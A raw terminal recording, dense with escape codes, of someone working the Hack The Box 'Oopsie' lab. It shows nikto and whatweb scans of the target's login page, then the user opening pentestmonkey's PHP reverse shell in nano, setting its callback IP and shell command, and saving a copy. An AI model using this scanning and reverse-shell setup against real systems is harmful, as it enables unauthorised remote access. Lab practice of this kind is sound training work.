++ /10.129.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.tar.lzma: Potentially interesting archive/cert file found.
++ /10.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.tar.lzma: Potentially interesting archive/cert file found.
++ /site.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.tar.lzma: Potentially interesting archive/cert file found.
++ /10.129.172.19.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.jks: Potentially interesting archive/cert file found.
++ /site.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.egg: Potentially interesting archive/cert file found.
++ /10.129.172.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.pem: Potentially interesting archive/cert file found.
++ /172.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.tar: Potentially interesting archive/cert file found.
++ /backup.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.cer: Potentially interesting archive/cert file found.
++ /1012917219.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.cer: Potentially interesting archive/cert file found.
++ /10_129_172_19.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.war: Potentially interesting archive/cert file found.
++ /19.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.tgz: Potentially interesting archive/cert file found.
++ /10.129.172.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.alz: Potentially interesting archive/cert file found.
++ /10.129.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.war: Potentially interesting archive/cert file found.
++ /10_129_172_19.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.jks: Potentially interesting archive/cert file found.
++ /10129172.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.pem: Potentially interesting archive/cert file found.
++ /1012917219.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.war: Potentially interesting archive/cert file found.
++ /1012917219.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.alz: Potentially interesting archive/cert file found.
++ /backup.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.alz: Potentially interesting archive/cert file found.
++ /site.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.tgz: Potentially interesting archive/cert file found.
++ /site.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.cer: Potentially interesting archive/cert file found.
++ /19.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.tar: Potentially interesting archive/cert file found.
++ /10.129.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.alz: Potentially interesting archive/cert file found.
++ /10_129_172_19.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.jks: Potentially interesting archive/cert file found.
++ /10.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.tar: Potentially interesting archive/cert file found.
++ /10.129.172.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.tar.bz2: Potentially interesting archive/cert file found.
++ /10129172.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.alz: Potentially interesting archive/cert file found.
++ /129.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.cer: Potentially interesting archive/cert file found.
++ /172.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.tar.lzma: Potentially interesting archive/cert file found.
++ /172.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.tar: Potentially interesting archive/cert file found.
++ /172.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.tar.bz2: Potentially interesting archive/cert file found.
++ /10.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.tgz: Potentially interesting archive/cert file found.
++ /backup.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /cdn-cgi/login/index.php/WEB-INF/web.xml: JRUN default file found.
++ OSVDB-44056: /cdn-cgi/login/index.php/sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.
++ OSVDB-10944: /cdn-cgi/login/index.php: CGI Directory found
++ OSVDB-10944: /cdn-cgi/login/index.php/cdn-cgi/login/: CGI Directory found
++ OSVDB-3092: /cdn-cgi/login/index.php/cdn-cgi/login/showuser.cgi: Shows the output of the 'whoami' command, which shows the web server user.
++ 9540 requests: 0 error(s) and 271 item(s) reported on remote host
++ End Time:           2022-05-15 22:37:21 (GMT0) (1264 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32mw[39m[32mw[39m[38;2;153;153;153mhatweb http://10.129.172.19/cdn-cgi/login/index.php[39m[51D[1m[31mw[1m[31mh[0m[39m[1m[31mw[1m[31mh[1m[31ma[0m[39m[1m[31ma[1m[31mt[0m[39m[0m[32mw[0m[32mh[0m[32ma[0m[32mt[32mw[32me[32mb[39m[39m [39mh[39mt[39mt[39mp[39m:[39m/[39m/[39m1[39m0[39m.[39m1[39m2[39m9[39m.[39m1[39m7[39m2[39m.[39m1[39m9[39m/[39mc[39md[39mn[39m-[39mc[39mg[39mi[39m/[39ml[39mo[39mg[39mi[39mn[39m/[39mi[39mn[39md[39me[39mx[39m.[39mp[39mh[39mp[?1l>[?2004l
+[1m[34mhttp://10.129.172.19/cdn-cgi/login/index.php[0m [200 OK] [1mApache[0m[[1m[32m2.4.29[0m], [1mCountry[0m[[0m[22mRESERVED[0m][[1m[31mZZ[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mUbuntu Linux[0m][[1m[36mApache/2.4.29 (Ubuntu)[0m], [1mIP[0m[[0m[22m10.129.172.19[0m], [1mPasswordField[0m[[0m[22mpassword[0m], [1mScript[0m, [1mTitle[0m[[1m[33mLogin[0m]
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mh[0m[39m[1m[31mh[0m[39m[38;2;153;153;153mh psexec[39m[8D[1m[31mh[1m[31mh[0m[39m[39m [39md[39m [39m [39m [39m [39m irbuster[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [1m[31mhh[0m[39m dirbuster[K[?1l>[?2004l
+hh: command not found
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31me[0m[39m[1m[31me[0m[39m[38;2;153;153;153mxport nmap="~/Hacking/nmap.sh"[39m[30D[0m[32me[32mx[39m[1m[31me[1m[31mx[1m[31mp[0m[39m[1m[31mp[1m[31mo[0m[39m[1m[31mo[1m[31mr[0m[39m[1m[36me[1m[36mx[1m[36mp[1m[36mo[1m[36mr[1m[36mt[0m[39m[39m [39mh[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23Dh  [38;2;153;153;153mnmap="~/Hacking/nmap.sh"[39m[24D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[38;2;153;153;153m nmap="~/Hacking/nmap.sh"[39m[25D[1m[31me[1m[31mx[1m[31mp[1m[31mo[1m[31mr[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [26D[38;2;153;153;153mt nmap="~/Hacking/nmap.sh"[39m[26D[1m[31mo[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[38;2;153;153;153mrt nmap="~/Hacking/nmap.sh"[39m[27D[1m[31mp[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[38;2;153;153;153mort nmap="~/Hacking/nmap.sh"[39m[28D[0m[32me[0m[32mx[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [29D[38;2;153;153;153mport nmap="~/Hacking/nmap.sh"[39m[29D[1m[31me[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [30D[1m[31me[0m[39m[38;2;153;153;153mxport nmap="~/Hacking/nmap.sh"[39m[30D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [31D[4ma[24m[4ma[24m[38;2;153;153;153mdf[39m[24m[1m[31ma[1m[31ml[0m[39m[39m [1m[31ma[1m[31ml[1m[31mi[0m[39m[1m[31mi[1m[31ma[0m[39m[0m[32ma[0m[32ml[0m[32mi[0m[32ma[32ms[39m export=       hh=[33m"[39m[33m"[33m~[39m[33m~[33m/[39m[33m/[33me[39m[33me[33mx[39m[33me[39m[39m [33m/[39m[39m [33m/[33ma[39m[33ma[33ml[39m[33ml[33mi[39m[33mi[33ma[39m[33ma[33ma[39m[33ma[33ms[39m[33ma[39m[39m [33ma[39m[39m [33ma[33ms[39m[33ma[39m[39m [33mi[39m[39m [33ml[39m[39m [33ma[39m[39m [33m/[39m[39m [33m~[39m[39m [33m"[39m[39m [39m    [1m[31ma[1m[31ml[1m[31mi[1m[31ma[0m[39m[39m [1m[31mi[0m[39m[0m[39m [1m[31ma[1m[31ml[0m[39m[0m[39m [0m[39m[4ma[24m[0m[39m [4ma[24m[38;2;153;153;153mdf[39m[24m [39m [39m [H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[1m[31ms[0m[39m[1m[31ms[0m[39m[38;2;153;153;153mudo apt-get install mongodb-clients[39m[35D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [36D[32ml[39m[32ml[39m[38;2;153;153;153ms /dev/tcp[39m[10D[32ml[32ms[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [9D[?1l>[?2004l
+'admin.php?content=uploads'   [0m[01;32mcurlyeah.sh[0m   oopsie.nmap.txt   OOPSIE.pdf   php-reverse-shell.php   typescript
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mn[0m[39m[1m[31mn[0m[39m[38;2;153;153;153mikto -h http://10.129.172.19/cdn-cgi/login/index.php[39m[52D[1m[31mn[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [51D[38;2;153;153;153mno shell.php[39m[12D[1m[31mn[1m[31ma[1m[31mn[0m[39m[0m[32mn[0m[32ma[0m[32mn[32mo[39m[39m [39mr[39m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153medis_input.txt[39m[14D[39me[39mv[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[8D[39mn[39ma[39mn[39mo[4C
+[JCompleting `file'[A[0m[27m[24m[0m[39m[4Cnano rev[K[0m[39m[8D[32mn[32ma[32mn[32mo[39m[4Ce[9D[39mn[39ma[39mn[39mo[5C
+[J[JCompleting `file'[A[0m[27m[24m[0m[39m[4Cnano reve[K[0m[39m[9D[32mn[32ma[32mn[32mo[39m[4C  [38;2;153;153;153mdis_input.txt[39m[13D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153medis_input.txt[39m[14D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[38;2;153;153;153mshell.php[39m[9D[39m[4mp[24m[39m [39m [39m [39m [39m [39m [39m [39m [8D[4mp[4mh[24m[4mh[4mp[24m[4mp[4m-reverse-shell.php[24m[1m [0m[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [32mnano[39m [4mphp-reverse-shell.php[24m[1m [0m[K[0m [?1l>[?2004l
+[?2004h[?1049h[22;0;0t[1;20r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[18;77H(B[0;7m[ Reading... ](B[m[18;75H(B[0;7m[ Read 192 lines ](B[m[H(B[0;7m  GNU nano 6.0                                                             php-reverse-shell.php                                                                       [1;166H(B[m[19d(B[0;7m^G(B[m Help[19;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut[19;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[19;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[20d(B[0;7m^X(B[m Exit[20;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste[20;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[20;113H(B[0;7mM-6(B[m Copy[20;129H(B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[2d(B[0;1m[32m<?php[3d[34m// php-reverse-shell - A Reverse Shell implementation in PHP[4d// Copyright (C) 2007 pentestmonkey@pentestmonkey.net[5d//[6d// This tool may be used for legal purposes only.  Users take full responsibility[7d// for any actions performed using this tool.  The author accepts no liability[8d// for damage caused by this tool.  If these terms are not acceptable to you, then[9d// do not use this tool.[10d//[11d// In all other respects the GPL version 2 applies:[12d//[13d// This program is free software; you can redistribute it and/or modify[14d// it under the terms of the GNU General Public License version 2 as[15d// published by the Free Software Foundation.[16d//[17d// This program is distributed in the hope that it will be useful,[2d[39m(B[m[?12l[?25h[?25l[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h[11d[?25l[?12l[?25h[12d[?25l[?12l[?25h[13d[?25l[?12l[?25h[14d[?25l[?12l[?25h[15d[?25l[?12l[?25h[16d[?25l[?12l[?25h[17d[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// but WITHOUT ANY WARRANTY; without even the implied warranty of[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// GNU General Public License for more details.[39m(B[m[?25l[18d[K[?12l[?25h7[2;18r8
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// You should have received a copy of the GNU General Public License along[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// with this program; if not, write to the Free Software Foundation, Inc.,[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This tool may be used for legal purposes only.  Users take full responsibility[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// for any actions performed using this tool.  If these terms are not acceptable to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// you, then do not use this tool.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// You are encouraged to send comments, improvements or suggestions to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// me at pentestmonkey@pentestmonkey.net[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Description[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This script will make an outbound TCP connection to a hardcoded IP and port.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// The recipient will be given a shell running as the current user (apache normally).[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Limitations[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// proc_open and stream_set_blocking require PHP version 4.3+, or 5+[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Usage[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1Hset_time_limit (0);[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$VERSION[39m(B[m = (B[0;1m[33m"1.0"[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$ip[39m(B[m = (B[0;1m[33m'127.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$port[39m(B[m = 1234;(B[0;1m[34m       // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$chunk_size[39m(B[m = 1400;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$write_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$error_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$shell[39m(B[m = (B[0;1m[33m'uname -a; w; id; /bin/sh -i'[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$daemon[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$debug[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[C[?25l[?12l[?25h[C[?25l[?12l[?25h[C[?25l[?12l[?25h[C[?25l[?12l[?25h[C[?25l[?12l[?25h [?25l[?12l[?25h=[?25l[?12l[?25h [?25l[?12l[?25h1[?25l[?12l[?25h2[?25l[?12l[?25h[A[?25l[?12l[?25h[?25l[?12l[?25h[?25l[1;98H(B[0;7m*[166G(B[m[?12l[?25h[8;9H(B[0;1m[33m027.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;10H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m.27.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;11H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m127.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;12H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m027.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;13H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m.27.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;14H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m127.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;15H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m527.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;16H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m.27.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;17H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m127.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;18H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m627.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;19H[39m(B[m[?25l[?12l[?25h(B[0;1m[33m527.0.0.1'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[8;20H[39m(B[m[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[?12l[?25h[1P[?25l[18d(B[0;7mSave modified buffer?                                                                                                                                                  [19;1H Y(B[m Yes[K[20d(B[0;7m N(B[m No  [20;18H(B[0;7mC(B[m Cancel[K[18;23H[?12l[?25h[?25l[19d(B[0;7m^G(B[m Help[19;42H(B[0;7mM-D(B[m DOS Format[19;83H(B[0;7mM-A(B[m Append[19;124H(B[0;7mM-B(B[m Backup File[20d(B[0;7m^C(B[m Cancel[17G         [20;42H(B[0;7mM-M(B[m Mac Format[20;83H(B[0;7mM-P(B[m Prepend[20;124H(B[0;7m^T(B[m Browse[18d(B[0;7mFile Name to Write: php-reverse-shell.php(B[m[?12l[?25h[?25l[18;76H[1K (B[0;7m[ Writing... ](B[m[K[1;98H(B[0;7m [166G(B[m[18;75H(B[0;7m[ Wrote 192 lines ](B[m[J[20d[?12l[?25h[20;1H[?1049l[23;0;0t[?1l>[?2004l                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32mnano[39m [4mphp-reverse-shell.php[24m[?1l>[?2004l
+[?2004h[?1049h[22;0;0t[1;20r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[18;77H(B[0;7m[ Reading... ](B[m[18;75H(B[0;7m[ Read 192 lines ](B[m[H(B[0;7m  GNU nano 6.0                                                             php-reverse-shell.php                                                                       [1;166H(B[m[19d(B[0;7m^G(B[m Help[19;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut[19;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[19;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[20d(B[0;7m^X(B[m Exit[20;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste[20;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[20;113H(B[0;7mM-6(B[m Copy[20;129H(B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[2d(B[0;1m[32m<?php[3d[34m// php-reverse-shell - A Reverse Shell implementation in PHP[4d// Copyright (C) 2007 pentestmonkey@pentestmonkey.net[5d//[6d// This tool may be used for legal purposes only.  Users take full responsibility[7d// for any actions performed using this tool.  The author accepts no liability[8d// for damage caused by this tool.  If these terms are not acceptable to you, then[9d// do not use this tool.[10d//[11d// In all other respects the GPL version 2 applies:[12d//[13d// This program is free software; you can redistribute it and/or modify[14d// it under the terms of the GNU General Public License version 2 as[15d// published by the Free Software Foundation.[16d//[17d// This program is distributed in the hope that it will be useful,[2d[39m(B[m[?12l[?25h[?25l[18d[J[20d[?12l[?25h[20;1H[?1049l[23;0;0t[?1l>[?2004l                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mc[24m[4mc[24m[38;2;153;153;153md ..[39m[24m[32mc[32mp[39m[39m [39m [39m [38;2;153;153;153m /hackthebox/TIER2/archetype/winPEASx64.exe Downloads[39m[53D[39m [39m[4mp[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [51D[4mp[4mh[24m[4mh[4mp[24m[4mp[4m-reverse-shell.php[24m[1m [0m[0m [4mp[24m[4mp[4mh[24m[4mh[4mp[24m[4mp[4m-reverse-shell.php[24m[1m [0m[0m [17D[24mp[24mh[24mp[24m-[24mr[24me[24mv[24me[24mr[24ms[24me[24m-[24ms[24mh[24me[24ml[24ml[24m2[24m.[24mp[24mhp[?1l>[?2004l
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
